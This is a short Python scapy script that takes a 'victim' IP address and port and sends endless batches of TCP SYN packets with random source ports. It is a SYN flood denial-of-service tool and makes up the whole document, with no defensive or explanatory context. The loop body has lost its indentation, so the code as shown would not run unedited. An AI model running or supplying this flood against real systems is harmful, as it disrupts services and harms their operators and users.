import sys
from scapy.all import *
target_ip = sys.argv[1] # the ip of the victim machine
target_port = sys.argv[2] # the port of the victim machine
while (1==1):
p=IP(dst=target_ip,id=1111,ttl=99)/TCP(sport=RandShort(), dport=int(target_port) ,seq=12345,ack=1000,window=1000,flags="S")
send(p, verbose=0, count=100)